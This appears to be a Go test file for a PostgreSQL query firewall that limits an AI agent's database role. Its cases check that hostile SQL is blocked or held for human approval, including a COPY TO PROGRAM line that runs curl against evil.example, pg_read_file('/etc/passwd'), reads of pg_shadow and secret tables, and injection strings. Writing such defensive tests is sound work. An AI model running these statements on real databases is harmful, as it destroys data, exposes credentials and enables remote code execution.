package firewall

import (
	"testing"

	"github.com/duhanguler/pgveil/internal/policy"
)

func testAIAgentProfile() *policy.RoleProfile {
	return &policy.RoleProfile{
		Name: "ai_agent",
		Firewall: policy.FirewallPolicy{
			AllowStatements:         []string{"SELECT", "EXPLAIN", "SHOW"},
			BlockDDL:                true,
			BlockMultiStatement:     true,
			BlockWriteWithoutWhere:  true,
			BlockDangerousFunctions: true,
			BlockSystemCatalogs:     true,
			RequireHITLStatements:   []string{"UPDATE", "DELETE", "INSERT"},
			HITLMode:                "hold",
			DeniedTables:            []string{"api_secrets", "pg_shadow", "pg_authid"},
			MaxRows:                 25,
			MaxRowsAction:           "truncate",
		},
	}
}

func TestASTFirewallEnforcements(t *testing.T) {
	prof := testAIAgentProfile()

	cases := []struct {
		name       string
		sql        string
		wantAction Action
		wantRule   string
	}{
		{
			name:       "safe customer select",
			sql:        "SELECT id, full_name, email FROM customers WHERE city = 'Istanbul' LIMIT 10",
			wantAction: ActionAllow,
			wantRule:   "policy_allow",
		},
		{
			name:       "drop table DDL blocked",
			sql:        "DROP TABLE orders",
			wantAction: ActionBlock,
			wantRule:   "block_ddl",
		},
		{
			name:       "truncate table blocked",
			sql:        "TRUNCATE TABLE customers CASCADE",
			wantAction: ActionBlock,
			wantRule:   "block_ddl",
		},
		{
			name:       "multi-statement SQL injection blocked",
			sql:        "SELECT id FROM customers LIMIT 1; DROP TABLE orders;",
			wantAction: ActionBlock,
			wantRule:   "block_multi_statement",
		},
		{
			name:       "delete without where blocked",
			sql:        "DELETE FROM orders",
			wantAction: ActionBlock,
			wantRule:   "block_write_without_where",
		},
		{
			name:       "delete with 1=1 tautology blocked",
			sql:        "DELETE FROM orders WHERE 1 = 1",
			wantAction: ActionBlock,
			wantRule:   "block_write_without_where",
		},
		{
			name:       "update with OR true tautology blocked",
			sql:        "UPDATE orders SET status = 'cancelled' WHERE id = 5 OR true",
			wantAction: ActionBlock,
			wantRule:   "block_write_without_where",
		},
		{
			name:       "modifying CTE bypass caught as HITL or blocked",
			sql:        "WITH wiped AS (DELETE FROM orders WHERE id = 1001 RETURNING *) SELECT * FROM wiped",
			wantAction: ActionRequireHITL,
			wantRule:   "require_hitl_delete",
		},
		{
			name:       "modifying CTE without WHERE blocked",
			sql:        "WITH wiped AS (DELETE FROM orders RETURNING *) SELECT * FROM wiped",
			wantAction: ActionBlock,
			wantRule:   "block_write_without_where",
		},
		{
			name:       "scoped update triggers HITL approval",
			sql:        "UPDATE orders SET status = 'refunded' WHERE id = 1001",
			wantAction: ActionRequireHITL,
			wantRule:   "require_hitl_update",
		},
		{
			name:       "pg_read_file blocked",
			sql:        "SELECT pg_read_file('/etc/passwd')",
			wantAction: ActionBlock,
			wantRule:   "block_dangerous_functions",
		},
		{
			name:       "nested dangerous function inside COALESCE blocked",
			sql:        "SELECT COALESCE(pg_ls_dir('.'), 'x')",
			wantAction: ActionBlock,
			wantRule:   "block_dangerous_functions",
		},
		{
			name:       "COPY TO PROGRAM RCE blocked",
			sql:        "COPY orders TO PROGRAM 'curl http://evil.example'",
			wantAction: ActionBlock,
			wantRule:   "block_copy_program",
		},
		{
			name:       "DO anonymous block blocked",
			sql:        "DO $$ BEGIN PERFORM 1; END $$;",
			wantAction: ActionBlock,
			wantRule:   "block_do_block",
		},
		{
			name:       "SET ROLE escalation blocked",
			sql:        "SET ROLE postgres",
			wantAction: ActionBlock,
			wantRule:   "block_role_escalation",
		},
		{
			name:       "restricted table api_secrets blocked",
			sql:        "SELECT service_name, secret_value FROM public.api_secrets",
			wantAction: ActionBlock,
			wantRule:   "denied_table",
		},
		{
			name:       "restricted table hidden inside subquery blocked",
			sql:        "SELECT * FROM (SELECT secret_value FROM api_secrets) s",
			wantAction: ActionBlock,
			wantRule:   "denied_table",
		},
		{
			name:       "system catalog pg_shadow blocked",
			sql:        "SELECT usename, passwd FROM pg_catalog.pg_shadow",
			wantAction: ActionBlock,
			wantRule:   "denied_table",
		},
		{
			name:       "driver transaction BEGIN allowed",
			sql:        "BEGIN",
			wantAction: ActionAllow,
			wantRule:   "policy_allow",
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			dec := Evaluate(tc.sql, prof)
			if dec.Action != tc.wantAction {
				t.Fatalf("SQL=%q\ngot action=%s (rule=%s reason=%q)\nwant action=%s (rule=%s)",
					tc.sql, dec.Action, dec.Rule, dec.Reason, tc.wantAction, tc.wantRule)
			}
			if tc.wantRule != "" && dec.Rule != tc.wantRule {
				t.Errorf("got rule=%q want %q", dec.Rule, tc.wantRule)
			}
		})
	}
}

func BenchmarkEvaluateAST(b *testing.B) {
	prof := testAIAgentProfile()
	q := "SELECT c.id, c.full_name, c.email, o.order_number, o.total_amount FROM customers c JOIN orders o ON o.customer_id = c.id WHERE c.city = 'Istanbul' ORDER BY o.created_at DESC LIMIT 20"
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = Evaluate(q, prof)
	}
}
